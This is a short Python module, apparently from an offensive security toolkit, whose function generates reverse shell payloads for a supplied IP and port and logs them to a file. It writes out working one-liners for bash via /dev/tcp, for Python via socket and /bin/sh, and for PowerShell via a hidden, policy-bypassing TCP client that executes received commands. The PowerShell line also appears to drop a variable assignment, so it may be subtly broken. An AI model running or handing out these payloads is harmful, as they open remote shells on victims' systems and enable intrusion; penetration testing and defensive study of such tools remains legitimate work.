from ost.utils.helpers import log_output

def generate_reverse_shells(ip, port):
    print(f"\n[+] Generating reverse shell payloads for {ip}:{port}")

    payloads = {
        "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"
    }

    # Combine for logging
    combined = "\n".join([f"[+] {name}:\n{cmd}\n" for name, cmd in payloads.items()])
    log_output(combined, "payloads_generated.txt")

    return payloads
